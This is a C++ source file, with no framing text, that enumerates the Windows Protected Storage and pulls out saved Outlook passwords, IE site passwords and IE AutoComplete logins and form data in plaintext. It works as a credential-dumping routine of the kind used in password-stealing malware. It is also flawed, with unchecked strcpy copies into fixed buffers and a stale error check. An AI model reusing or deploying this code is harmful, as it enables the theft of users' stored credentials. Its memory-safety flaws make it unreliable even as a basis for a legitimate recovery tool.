#import "pstorec.dll" no_namespace

typedef HRESULT (WINAPI *Fun_PStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);

typedef VOID (CALLBACK *Fun_PstEnumProc)(GUID TypeGUID, GUID SubTypeGUID, WCHAR *pItemName, BYTE * pData, DWORD dwDatSize, VOID *pParam);
typedef VOID (CALLBACK *Fun_PstEnumProcSimp)(CHAR *pType, CHAR *pResName, CHAR *pUserName, CHAR *pPassWord, VOID *pParam);

BOOL EnumPStorage(Fun_PstEnumProc fPstEnumProc, VOID *pParam);

typedef struct _EnumPStorageProcData
{
	VOID *				pParam;
	Fun_PstEnumProcSimp	fPstEnumProcSimp;
}EnumPStorageProcData;


VOID CALLBACK MyPstEnumProc(GUID TypeGUID, GUID SubTypeGUID, WCHAR *pItemName, BYTE * pData, DWORD dwDatSize, VOID *pParam)
{
	EnumPStorageProcData*	pProcData;
	DWORD					dwId;
	VOID *					pOldParam;
	Fun_PstEnumProcSimp		fPstEnumProcSimp;
	CHAR					szType[1024];
	CHAR					szResName[1024];
	CHAR					szUserName[1024];
	CHAR					szPassWord[1024];
	CHAR					szData[1024];
	CHAR *					pFind;
	int						i;
	WCHAR *					pWChar;

	pProcData = (EnumPStorageProcData *)pParam;
	fPstEnumProcSimp = pProcData->fPstEnumProcSimp;
	pOldParam = pProcData->pParam;

	dwId = *(DWORD *)&TypeGUID;
	//220D5CC1 Outlooks
	//5E7E8100 IE:Password-Protected sites
	//B9819C52 MSN Explorer Signup
	//E161255A IE

	szType[0] = 0;
	szResName[0] = 0;
	szUserName[0] = 0;
	szPassWord[0] = 0;

	switch(dwId)
	{
	case 0x220D5CC1:
		strcpy(szType, "Outlooks");
		NStr::WChar2Char(pItemName, szUserName, sizeof(szUserName));
		strcpy(szPassWord, (CHAR *)pData);
		break;
	case 0x5E7E8100:
		strcpy(szType, "IE:Password-Protected sites");
		NStr::WChar2Char(pItemName, szType, sizeof(szType));

		memset(szData, 0, sizeof(szData));
		memcpy(szData, pData, dwDatSize);
		pFind = strchr(szData, ':');
		if(pFind == NULL)
			return;

		pFind[0] = 0;
		strcpy(szUserName, szData);
		strcpy(szPassWord, pFind+1);
		break;
	case 0xB9819C52:
		strcpy(szType, "MSN Explorer Signup");
		break;
	case 0xE161255A:
		strcpy(szType, "IE");
		NStr::WChar2Char(pItemName, szResName, sizeof(szResName));
		strcpy(szData, szResName);
		pFind = strstr(szData, "StringIndex");
		if(pFind)
			return;

		pFind = strstr(szData, ":String");
		if(pFind)
			pFind[0] = 0;

		if( (strstr(szData, "http:/") == NULL) &&
			(strstr(szData, "https:/") == NULL) )
		{
			strcpy(szType, "IE Auto Complete Fields");

			memset(szData, 0, sizeof(szData));
			memcpy(szData, pData, dwDatSize);
			pWChar = (WCHAR *)szData;
			for(i=0; i<(int)(dwDatSize/sizeof(WCHAR)-1); i++)
			{
				if(pWChar[i] == 0)
					pWChar[i] = ',';
			}

			NStr::WChar2Char(pWChar, szUserName, sizeof(szUserName));
		}
		else
		{
			strcpy(szType, "IE AutoComplete Passwords");
			strcpy(szResName, szData);

			memset(szData, 0, sizeof(szData));
			memcpy(szData, pData, dwDatSize);
			pWChar = (WCHAR *)szData;
			NStr::WChar2Char(pWChar, szUserName, sizeof(szUserName));
			pWChar = pWChar + wcslen(pWChar) + 1;
			NStr::WChar2Char(pWChar, szPassWord, sizeof(szPassWord));
		}
		break;
	default:
		break;
	}

	fPstEnumProcSimp(szType, szResName, szUserName, szPassWord, pOldParam);

	return;
}



BOOL EnumPStorage(Fun_PstEnumProcSimp fPstEnumProcSimp, VOID *pParam)
{
	BOOL					bRetVal;
	EnumPStorageProcData	ProcData;

	ProcData.pParam = pParam;
	ProcData.fPstEnumProcSimp = fPstEnumProcSimp;

	bRetVal = EnumPStorage(MyPstEnumProc, &ProcData);

	return bRetVal;
}


BOOL EnumPStorage(Fun_PstEnumProc fPstEnumProc, VOID *pParam)
{
	Fun_PStoreCreateInstance fPStoreCreateInstance;
	IPStorePtr			pPStore;
	IEnumPStoreTypesPtr pEnumPStoreTypes;
	IEnumPStoreTypesPtr pEnumSubTypes;
	IEnumPStoreItemsPtr pEnumItems;

	HMODULE				hMod; 
	HRESULT				hr;

	hMod = LoadLibraryA("pstorec.dll");
	if(hMod == NULL)
		return FALSE;

	fPStoreCreateInstance = (Fun_PStoreCreateInstance)GetProcAddress(hMod, "PStoreCreateInstance");
	if(fPStoreCreateInstance == NULL)
		return FALSE;

	hr = fPStoreCreateInstance(&pPStore, 0, 0, 0); 
	if(FAILED(hr))
		return FALSE;

	hr = pPStore->EnumTypes(0, 0, &pEnumPStoreTypes);
	if(FAILED(hr))
		return FALSE;


	GUID	TypeGUID;
	GUID	SubTypeGUID;
	WCHAR *	pItemName;

	for(;;)
	{
		hr = pEnumPStoreTypes->raw_Next(1, &TypeGUID, NULL);
		if(FAILED(hr))
			break;
		hr = pPStore->EnumSubtypes(0, &TypeGUID, 0, &pEnumSubTypes);
		if(FAILED(hr))
			break;

		for(;;)
		{
			hr = pEnumSubTypes->raw_Next(1, &SubTypeGUID, NULL);
			if(FAILED(hr))
				break;
			hr = pPStore->EnumItems(0, &TypeGUID, &SubTypeGUID, 0, &pEnumItems);
			if(FAILED(hr))
				break;

			for(;;)
			{
				hr = pEnumItems->raw_Next(1, &pItemName, NULL);
				if(FAILED(hr))
					break;

				DWORD				dwDatSize;
				BYTE *				pData;

				pData = NULL;
				dwDatSize = 0;
				pPStore->ReadItem(0, &TypeGUID, &SubTypeGUID, pItemName, &dwDatSize, &pData, NULL, 0);
				if(FAILED(hr))
					break;

				fPstEnumProc(TypeGUID, SubTypeGUID, pItemName, pData, dwDatSize, pParam);

				LocalFree(pData);				
				LocalFree(pItemName);
			}
		}
	}

	return TRUE;
}






































